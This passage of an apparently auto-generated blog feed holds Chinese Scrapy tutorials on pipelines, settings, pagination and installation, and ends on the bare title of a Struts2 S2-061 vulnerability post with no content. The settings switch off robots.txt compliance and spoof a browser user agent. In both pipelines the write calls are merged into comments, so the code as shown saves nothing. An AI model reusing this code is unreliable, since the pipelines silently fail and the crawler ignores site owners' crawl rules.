</span></span><br><span class="line"><span class="comment"># https://docs.scrapy.org/en/latest/topics/items.html   </span></span><br><span class="line"><span class="keyword">import</span> scrapy  </span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiaohuascrapyproItem</span>(<span class="params">scrapy.Item</span>):</span>  </span><br><span class="line"> <span class="comment"># define the fields for your item here like:  </span></span><br><span class="line"> <span class="comment"># 初始化标题  </span></span><br><span class="line"> title = scrapy.Field()  </span><br><span class="line"> <span class="comment"># 初始化内容  </span></span><br><span class="line"> content = scrapy.Field()</span><br></pre></td></tr></table></figure><p>pipelines.py:<br>用于处理数据，例如将数据保存在文件或数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Define your item pipelines here  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># Don&#x27;t forget to add your pipeline to the ITEM_PIPELINES setting  </span></span><br><span class="line"><span class="comment"># See: https://docs.scrapy.org/en/latest/topics/item-pipeline.html  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># useful for handling different item types with a single interface  </span></span><br><span class="line"><span class="keyword">from</span> itemadapter <span class="keyword">import</span> ItemAdapter  </span><br><span class="line"><span class="keyword">import</span> csv  </span><br><span class="line"><span class="keyword">import</span> json  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiaohuascrapyproPipeline</span>:</span>  </span><br><span class="line"> <span class="comment"># 开始爬虫方法  </span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self, spider</span>):</span>  </span><br><span class="line"> <span class="comment"># 生成文件句柄，操作  </span></span><br><span class="line"> self.f = <span class="built_in">open</span>(<span class="string">&#x27;xiaohua.csv&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line"> <span class="comment"># 创建csv 写实例  </span></span><br><span class="line"> self.csv_write = csv.DictWriter(self.f,fieldnames=[<span class="string">&#x27;title&#x27;</span>,<span class="string">&#x27;content&#x27;</span>])  </span><br><span class="line"> <span class="comment"># 写入头部信息  </span></span><br><span class="line"> self.csv_write.writeheader()  </span><br><span class="line">  </span><br><span class="line"> <span class="comment"># 进行中  </span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span>  </span><br><span class="line"> <span class="comment"># 将 item 写入 csv    self.csv_write.writerow(dict(item))  </span></span><br><span class="line">  <span class="keyword">return</span> item  </span><br><span class="line">  </span><br><span class="line"> <span class="comment"># 结束爬虫方法  </span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self, spider</span>):</span>  </span><br><span class="line">  <span class="comment"># 文件关闭  </span></span><br><span class="line">  self.f.close()  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiaohuascrapyproJsonPipeline</span>:</span>  </span><br><span class="line"> <span class="comment"># 开始爬虫方法  </span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self, spider</span>):</span>  </span><br><span class="line">  <span class="comment"># 生成文件句柄，操作  </span></span><br><span class="line">  self.f = <span class="built_in">open</span>(<span class="string">&#x27;xiaohua.json&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"> <span class="comment"># 进行中  </span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span>  </span><br><span class="line">  <span class="comment"># 将 item 写入 csv        self.f.write(json.dumps(dict(item),ensure_ascii=False) + &#x27;,&#x27;)  </span></span><br><span class="line">  <span class="keyword">return</span> item  </span><br><span class="line">  </span><br><span class="line"> <span class="comment"># 结束爬虫方法  </span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self, spider</span>):</span>  </span><br><span class="line">  <span class="comment"># 文件关闭  </span></span><br><span class="line">  self.f.close()</span><br></pre></td></tr></table></figure><p>settings.py：<br>定义了各种规则，例如是否遵守robot规则，UserAgent的定义，管道的开启等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Scrapy settings for xiaohuaScrapyPro project  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># For simplicity, this file contains only settings considered important or  </span></span><br><span class="line"><span class="comment"># commonly used. You can find more settings consulting the documentation:  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/settings.html  </span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/downloader-middleware.html  </span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/spider-middleware.html  </span></span><br><span class="line">  </span><br><span class="line">BOT_NAME = <span class="string">&#x27;xiaohuaScrapyPro&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;xiaohuaScrapyPro.spiders&#x27;</span>]  </span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;xiaohuaScrapyPro.spiders&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent  </span></span><br><span class="line">USER_AGENT = <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Obey robots.txt rules  </span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Configure maximum concurrent requests performed by Scrapy (default: 16)  </span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS = 32  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># Configure a delay for requests for the same website (default: 0)  </span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/settings.html#download-delay  </span></span><br><span class="line"><span class="comment"># See also autothrottle settings and docs  </span></span><br><span class="line"><span class="comment">#DOWNLOAD_DELAY = 3  </span></span><br><span class="line"><span class="comment"># The download delay setting will honor only one of:  </span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS_PER_DOMAIN = 16  </span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS_PER_IP = 16  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># Disable cookies (enabled by default)  </span></span><br><span class="line"><span class="comment">#COOKIES_ENABLED = False  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># Disable Telnet Console (enabled by default)  </span></span><br><span class="line"><span class="comment">#TELNETCONSOLE_ENABLED = False  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># Override the default request headers:  </span></span><br><span class="line"><span class="comment">#DEFAULT_REQUEST_HEADERS = &#123;  </span></span><br><span class="line"><span class="comment">#   &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,  </span></span><br><span class="line"><span class="comment">#   &#x27;Accept-Language&#x27;: &#x27;en&#x27;,  </span></span><br><span class="line"><span class="comment">#&#125;  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># Enable or disable spider middlewares  </span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/spider-middleware.html  </span></span><br><span class="line"><span class="comment">#SPIDER_MIDDLEWARES = &#123;  </span></span><br><span class="line"><span class="comment">#    &#x27;xiaohuaScrapyPro.middlewares.XiaohuascrapyproSpiderMiddleware&#x27;: 543,  </span></span><br><span class="line"><span class="comment">#&#125;  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># Enable or disable downloader middlewares  </span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html  </span></span><br><span class="line"><span class="comment">#DOWNLOADER_MIDDLEWARES = &#123;  </span></span><br><span class="line"><span class="comment">#    &#x27;xiaohuaScrapyPro.middlewares.XiaohuascrapyproDownloaderMiddleware&#x27;: 543,  </span></span><br><span class="line"><span class="comment">#&#125;  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># Enable or disable extensions  </span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/extensions.html  </span></span><br><span class="line"><span class="comment">#EXTENSIONS = &#123;  </span></span><br><span class="line"><span class="comment">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,  </span></span><br><span class="line"><span class="comment">#&#125;  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># Configure item pipelines  </span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/item-pipeline.html  </span></span><br><span class="line">ITEM_PIPELINES = &#123;  </span><br><span class="line">    <span class="string">&#x27;xiaohuaScrapyPro.pipelines.XiaohuascrapyproPipeline&#x27;</span>: <span class="number">300</span>,  </span><br><span class="line"> <span class="string">&#x27;xiaohuaScrapyPro.pipelines.XiaohuascrapyproJsonPipeline&#x27;</span>: <span class="number">200</span>,  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Enable and configure the AutoThrottle extension (disabled by default)  </span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/autothrottle.html  </span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_ENABLED = True  </span></span><br><span class="line"><span class="comment"># The initial download delay  </span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_START_DELAY = 5  </span></span><br><span class="line"><span class="comment"># The maximum download delay to be set in case of high latencies  </span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_MAX_DELAY = 60  </span></span><br><span class="line"><span class="comment"># The average number of requests Scrapy should be sending in parallel to  </span></span><br><span class="line"><span class="comment"># each remote server  </span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0  </span></span><br><span class="line"><span class="comment"># Enable showing throttling stats for every response received:  </span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_DEBUG = False  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># Enable and configure HTTP caching (disabled by default)  </span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings  </span></span><br><span class="line"><span class="comment">#HTTPCACHE_ENABLED = True  </span></span><br><span class="line"><span class="comment">#HTTPCACHE_EXPIRATION_SECS = 0  </span></span><br><span class="line"><span class="comment">#HTTPCACHE_DIR = &#x27;httpcache&#x27;  </span></span><br><span class="line"><span class="comment">#HTTPCACHE_IGNORE_HTTP_CODES = []  </span></span><br><span class="line"><span class="comment">#HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>Scrapy 的工作流程图</strong>（图片来源：百度）<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/202201211716121.png"></p><h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><h3 id="直接在start-urls中添加"><a href="#直接在start-urls中添加" class="headerlink" title="直接在start_urls中添加"></a>直接在start_urls中添加</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start_urls = [<span class="string">&#x27;https://www.fun48.com/duanzi/&#x27;</span>,  </span><br><span class="line"> <span class="string">&#x27;https://www.fun48.com/duanzi/?page=2&#x27;</span>,  </span><br><span class="line"> <span class="string">&#x27;https://www.fun48.com/duanzi/?page=3&#x27;</span>,  </span><br><span class="line"> <span class="string">&#x27;https://www.fun48.com/duanzi/?page=4&#x27;</span>,  </span><br><span class="line"> <span class="string">&#x27;https://www.fun48.com/duanzi/?page=5&#x27;</span>,  </span><br><span class="line"> <span class="string">&#x27;https://www.fun48.com/duanzi/?page=6&#x27;</span>,  </span><br><span class="line"> ]</span><br></pre></td></tr></table></figure><blockquote><p>适合页数固定且少的情况</p></blockquote><h3 id="重新编写初始化方法"><a href="#重新编写初始化方法" class="headerlink" title="重新编写初始化方法"></a>重新编写初始化方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name=<span class="literal">None</span>, **kwargs</span>):</span>  </span><br><span class="line">    <span class="comment"># 调用父类的初始化方法  </span></span><br><span class="line"> <span class="built_in">super</span>(XiaohuaSpider, self).__init__(name,**kwargs)  </span><br><span class="line">    self.start_urls = [<span class="string">&#x27;https://www.fun48.com/duanzi/&#x27;</span>]  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">11</span>):  </span><br><span class="line">        self.start_urls.append(<span class="string">f&#x27;https://www.fun48.com/duanzi/?page=<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>适合页数固定但数量较多，或者需要从文件中读取信息</p></blockquote><h3 id="通过下一页标签进行回调"><a href="#通过下一页标签进行回调" class="headerlink" title="通过下一页标签进行回调"></a>通过下一页标签进行回调</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过查找下一页连接地址，实现scrapy.Requset 地址提交  </span></span><br><span class="line"><span class="comment"># 在分页元素中 判断是否存在下一页内容  </span></span><br><span class="line">next_text = response.xpath(<span class="string">&#x27;//div[@class=&quot;pg&quot;]/a[last()]/text()&#x27;</span>).get().strip()  </span><br><span class="line"><span class="keyword">if</span> next_text == <span class="string">&#x27;下一页&#x27;</span>:  </span><br><span class="line">    next_url =  response.xpath(<span class="string">&#x27;//div[@class=&quot;pg&quot;]/a[last()]/@href&#x27;</span>).get().strip()  </span><br><span class="line">    <span class="comment">#提交地址  </span></span><br><span class="line"> <span class="keyword">yield</span> scrapy.Request(next_url,callback=self.parse)</span><br></pre></td></tr></table></figure><blockquote><p>常用的方法</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;新建项目&quot;&gt;&lt;a href=&quot;#新建项目&quot; class=&quot;headerlink&quot; title=&quot;新建项目&quot;&gt;&lt;/a&gt;新建项目&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre</summary>
      
    
    
    
    <category term="Scrapy 爬虫框架" scheme="http://example.com/categories/Scrapy-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6/"/>
    
    
    <category term="Scrapy" scheme="http://example.com/tags/Scrapy/"/>
    
    <category term="Python，文章的爬取" scheme="http://example.com/tags/Python%EF%BC%8C%E6%96%87%E7%AB%A0%E7%9A%84%E7%88%AC%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>第一个Scrapy 程序 百度</title>
    <link href="http://example.com/2022/01/15/%E7%AC%AC%E4%B8%80%E4%B8%AAScrapy-%E7%A8%8B%E5%BA%8F-%E7%99%BE%E5%BA%A6/"/>
    <id>http://example.com/2022/01/15/%E7%AC%AC%E4%B8%80%E4%B8%AAScrapy-%E7%A8%8B%E5%BA%8F-%E7%99%BE%E5%BA%A6/</id>
    <published>2022-01-15T09:47:01.000Z</published>
    <updated>2022-01-21T10:01:22.763Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>声明</strong><br>本系列的文章是笔者通过视频学习，记录的笔记。如果需要更详细地进行学习，可以前往<a href="https://www.bilibili.com/video/BV1Tg411P7Sg">bilibili</a>进行相关学习</p></blockquote><ol><li>新建一个项目<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># scrapy startproject 项目名</span></span><br><span class="line">scrapy startproject baiduScrapyPro </span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/01/15/tIblE5xUXmPykQg.png" alt="新建项目"><br>进入刚刚新建的项目，查看文件目录<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入baiduScrapyPro文件夹</span></span><br><span class="line"><span class="built_in">cd</span> baiduScrapyPro</span><br><span class="line"><span class="comment"># 打印当前目录下目录结构</span></span><br><span class="line">tree /f</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2022/01/16/bTVXmxKHkJ9hNw8.png" alt="查看目录结构"></p><ol start="2"><li>使用预定义的模板生成新的爬虫<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># scrapy genspider 爬虫名 爬取地址</span></span><br><span class="line"><span class="comment"># scrapy genspider [options] &lt;name&gt; &lt;domain&gt;</span></span><br><span class="line"></span><br><span class="line">scrapy genspider baidu www.baidu.com</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2022/01/16/JyasANrud8MCHKb.png" alt="生成爬虫"></p><p>其中的options参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Options</span><br><span class="line"></span><br><span class="line">--<span class="built_in">help</span>, -h              显示此帮助信息并退出</span><br><span class="line"></span><br><span class="line">--list, -l              列出可用模板</span><br><span class="line"></span><br><span class="line">--edit, -e             创建后编辑蜘蛛</span><br><span class="line"></span><br><span class="line">--dump=TEMPLATE, -d TEMPLATE   将模板转储到标准输出</span><br><span class="line"></span><br><span class="line">--template=TEMPLATE, -t TEMPLATE    使用自定义模板</span><br><span class="line"></span><br><span class="line">--force                如果蜘蛛已经存在，用模板</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看文件目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tree /f</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/16/HBznL2EP7gTvKhu.png" alt="查看目录结构"><br>可以看到生成了 spiders 文件目录及 baidu.py文件<br><img src="https://s2.loli.net/2022/01/16/C7UGlMyweO39i6R.png"><br>进入 baidu.py 可以发现其中初始化的参数有<code>name</code> , <code>allowed_domains</code> 和<code>start_urls</code>,并且其中的数值是我们创建爬虫时输入的参数。并且还内置了一个方法，方法中传入的参数是response，所以这应该是一个处理返回数据的一个函数方法。</p><ol start="3"><li>启动爬虫<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># scrapy crawl 爬虫名 （用于启动指定的爬虫）</span></span><br><span class="line">scrapy crawl baidu</span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li>爬虫文件结构：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">─baiduScrapyPro   <span class="comment"># 项目文件夹</span></span><br><span class="line">    │  scrapy.cfg   <span class="comment"># 项目基本配置文件</span></span><br><span class="line">    │</span><br><span class="line">    └─baiduScrapyPro <span class="comment"># 用来装载项目文件的目录 </span></span><br><span class="line">        │  items.py <span class="comment"># 定义要抓取的数据结构</span></span><br><span class="line">        │  middlewares.py <span class="comment"># 中间间。用来设置一些处理规则</span></span><br><span class="line">        │  pipelines.py <span class="comment"># 管道文件，处理抓取的数据</span></span><br><span class="line">        │  settings.py  <span class="comment"># 全局配置文件 （例如：是否遵循robot规则)</span></span><br><span class="line">        │  __init__.py</span><br><span class="line">        │</span><br><span class="line">        ├─spiders <span class="comment"># 用来装载爬虫文件的目录</span></span><br><span class="line">        │  │  baidu.py  <span class="comment"># 具体的爬虫程序</span></span><br><span class="line">        │  │  __init__.py</span><br><span class="line">        │  │</span><br><span class="line">        │  └─__pycache__</span><br><span class="line">        │          baidu.cpython-38.pyc</span><br><span class="line">        │          __init__.cpython-38.pyc</span><br><span class="line">        │</span><br><span class="line">        └─__pycache__</span><br><span class="line">                settings.cpython-38.pyc</span><br><span class="line">                __init__.cpython-38.pyc</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;声明&lt;/strong&gt;&lt;br&gt;本系列的文章是笔者通过视频学习，记录的笔记。如果需要更详细地进行学习，可以前往&lt;a href=&quot;https://www.bilibili.com/video/BV1Tg411P7Sg&quot;&gt;bilibili</summary>
      
    
    
    
    <category term="Scrapy 爬虫框架" scheme="http://example.com/categories/Scrapy-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6/"/>
    
    
    <category term="Scrapy" scheme="http://example.com/tags/Scrapy/"/>
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Windows系统 Scrapy 下载</title>
    <link href="http://example.com/2022/01/15/Windows%E7%B3%BB%E7%BB%9F-Scrapy-%E4%B8%8B%E8%BD%BD/"/>
    <id>http://example.com/2022/01/15/Windows%E7%B3%BB%E7%BB%9F-Scrapy-%E4%B8%8B%E8%BD%BD/</id>
    <published>2022-01-15T09:39:06.000Z</published>
    <updated>2022-01-21T10:01:24.167Z</updated>
    
    <content type="html"><![CDATA[<h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><p>通过pip 进行 scrapy的安装</p><blockquote><p>pip install Scrapy</p></blockquote><p><img src="https://s2.loli.net/2022/01/15/C1inBSAxHuhTFcw.png" alt="安装scrapy"></p><h2 id="验证是否安装成功"><a href="#验证是否安装成功" class="headerlink" title="验证是否安装成功"></a>验证是否安装成功</h2><h3 id="版本验证"><a href="#版本验证" class="headerlink" title="版本验证"></a>版本验证</h3><blockquote><p>scrapt –version</p></blockquote><p><img src="https://s2.loli.net/2022/01/15/NXEBky6Pl8eMGTc.png" alt="验证scrapy版本"></p><h3 id="python导入验证"><a href="#python导入验证" class="headerlink" title="python导入验证"></a>python导入验证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python <span class="comment">#进入python</span></span><br><span class="line">import scrapy <span class="comment">#导入scrapy模块</span></span><br><span class="line"><span class="built_in">exit</span>() <span class="comment">#退出</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/15/yBHVZOGC1kmudWh.png"></p><h3 id="scrapy-验证"><a href="#scrapy-验证" class="headerlink" title="scrapy 验证"></a>scrapy 验证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy bench <span class="comment">#测试本地硬件的性能</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/15/OZuLMdQ6hw7zoPW.png"></p><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>更多的安装问题可以查看<a href="https://www.osgeo.cn/scrapy/intro/install.html">scrapy安装文档</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;下载安装&quot;&gt;&lt;a href=&quot;#下载安装&quot; class=&quot;headerlink&quot; title=&quot;下载安装&quot;&gt;&lt;/a&gt;下载安装&lt;/h2&gt;&lt;p&gt;通过pip 进行 scrapy的安装&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;pip install Scrapy&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Scrapy 爬虫框架" scheme="http://example.com/categories/Scrapy-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6/"/>
    
    
    <category term="Scrapy" scheme="http://example.com/tags/Scrapy/"/>
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Apache Struts2 S2-061 远程代码执行漏洞（CVE-2020-17530）</title>
    <link href="http://example.com/2021/12/28/Apache-Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89/"/>
    <id>http://example.com/2021/12/28/Apache-Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89/</id>
    <published>2021-12-28T15:13:32.000Z</published>
    <updated>2022-01-02T03:14:05.973Z</updated>
    
